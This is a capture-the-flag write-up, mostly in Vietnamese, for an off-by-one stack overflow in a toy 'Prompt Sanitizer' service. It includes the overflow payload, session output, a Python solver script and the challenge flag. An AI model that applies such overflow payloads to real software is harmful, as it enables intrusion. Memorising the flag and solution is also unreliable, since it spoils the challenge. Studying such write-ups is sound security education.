# Writeup: PWN CHALLENGE 2 (Prompt Sanitizer — Off-by-One)

> **Event:** DDC CTF  
> **Category:** PWN  
> **Difficulty:** Easy  
> **Points:** 79  
> **Description:** *"The Sanitizer Reads Exactly Thirty-Two Characters of Prompt, Plus One More for Good Measure."*  
> **Flag:** `flag{8b576a25-d44f-4e9a-95e8-da31bff133cd}`

---

## 1. Tóm tắt (TL;DR)

1. Kết nối tới dịch vụ **VinAI Prompt Sanitizer v1.0** qua `nc <host> 10117`.
2. Chương trình cho phép nhập prompt tối đa 32 ký tự, nhưng thực tế đọc **33 bytes** → **Off-by-One Overflow**.
3. Byte thứ 33 ghi đè **handler slot index** — chương trình dùng giá trị này để chọn handler function.
4. Chương trình cung cấp sẵn handler table:
   - Slot `0x00` → `safe_handler` (mặc định)
   - Slot `0x1F` → `win` (in flag)
5. Gửi 32 bytes padding + byte `0x1F` → ghi đè slot index thành `0x1F` → gọi hàm `win` → lấy flag.

---

## 2. Phân tích chi tiết

### Bước 1: Kết nối & khảo sát dịch vụ

```
$ nc 172.31.102.101 10117
=====================================
 VinAI Prompt Sanitizer -- v1.0
=====================================
handler table (slot -> action):
  0x00 -> safe_handler (default)
  0x1F -> win
  ...  -> no-op

Enter AI prompt (max 32 chars):
```

Chương trình hiển thị **handler table** rất rõ ràng:
- Slot `0x00`: `safe_handler` — handler mặc định, in thông báo "prompt sanitised".
- Slot `0x1F` (= 31 decimal): `win` — hàm in flag.
- Các slot khác: `no-op` — không làm gì.

### Bước 2: Hiểu cấu trúc bộ nhớ

Từ mô tả challenge: *"Reads Exactly Thirty-Two Characters of Prompt, Plus One More for Good Measure"*

Cấu trúc trên stack có thể hình dung:

```
+-----------------------------+
| prompt buffer (32 bytes)    |  ← input được ghi vào đây
+-----------------------------+
| handler_slot (1 byte)       |  ← byte thứ 33 ghi đè ở đây!
+-----------------------------+
```

Chương trình đọc `read(fd, buf, 33)` vào buffer 32 bytes → byte thứ 33 tràn sang biến `handler_slot` nằm ngay sau buffer.

### Bước 3: Test hoạt động

**Input ngắn (< 32 chars):**
```
Enter AI prompt: Hello
Processing prompt: Hello
prompt sanitised, nothing suspicious here.
Session finished.
```
→ Slot mặc định `0x00` → `safe_handler` được gọi.

**Input đúng 32 chars 'A':**
```
Enter AI prompt: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[?] unrecognised handler slot, ignoring.
```
→ Byte `0x0A` (newline) ghi vào slot → slot = `0x0A` → `no-op`.

### Bước 4: Exploit

Gửi **32 bytes padding** + byte **`0x1F`** để ghi đè handler slot thành `0x1F` → gọi hàm `win`:

```python
payload = b'A' * 32 + b'\x1f' + b'\n'
```

```
$ python -c "import sys; sys.stdout.buffer.write(b'A'*32 + b'\x1f\n')" | nc 172.31.102.101 10117
=====================================
 VinAI Prompt Sanitizer -- v1.0
=====================================
handler table (slot -> action):
  0x00 -> safe_handler (default)
  0x1F -> win
  ...  -> no-op

Enter AI prompt (max 32 chars):
Processing prompt: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[!] handler was hijacked -- here is the flag:
flag{8b576a25-d44f-4e9a-95e8-da31bff133cd}
```

### Giải thích mô tả challenge

> *"The Sanitizer Reads Exactly Thirty-Two Characters of Prompt, Plus One More for Good Measure."*

- **"Reads Exactly Thirty-Two Characters"** → buffer 32 bytes cho input.
- **"Plus One More for Good Measure"** → chương trình đọc thêm 1 byte (tổng 33), gây off-by-one overflow, ghi đè byte đầu tiên ngay sau buffer — chính là handler slot index.

---

## 3. Sơ đồ tấn công

```
 Buffer (32 bytes)              Slot
┌──────────────────────────────┬─────┐
│ A A A A A A A A A A A A ... A│\x1F │
└──────────────────────────────┴─────┘
  ↑ 32 bytes padding             ↑
                          Off-by-one byte
                          overwrites slot
                          to 0x1F → win()
```

---

## 4. Script giải tự động (`solve_pwn2.py`)

```python
#!/usr/bin/env python3
"""
Solver for PWN CHALLENGE 2 — Off-by-One on Prompt Sanitizer
"""
import socket
import sys

def solve(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.settimeout(5)

    # Read banner
    data = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if b'chars)' in data:
                break
        except socket.timeout:
            break
    print(data.decode(errors='ignore'))

    # Payload: 32 bytes padding + 0x1F (win handler slot)
    payload = b'A' * 32 + b'\x1f\n'
    s.sendall(payload)

    # Read response
    resp = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    s.close()

    output = resp.decode(errors='ignore')
    print(output)

    # Extract flag
    for line in output.split('\n'):
        if 'flag{' in line:
            flag = line[line.index('flag{'):line.index('}') + 1]
            print(f"[+] Flag: {flag}")
            return flag

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '172.31.102.101'
    port = sys.argv[2] if len(sys.argv) > 2 else '10117'
    solve(host, port)
```
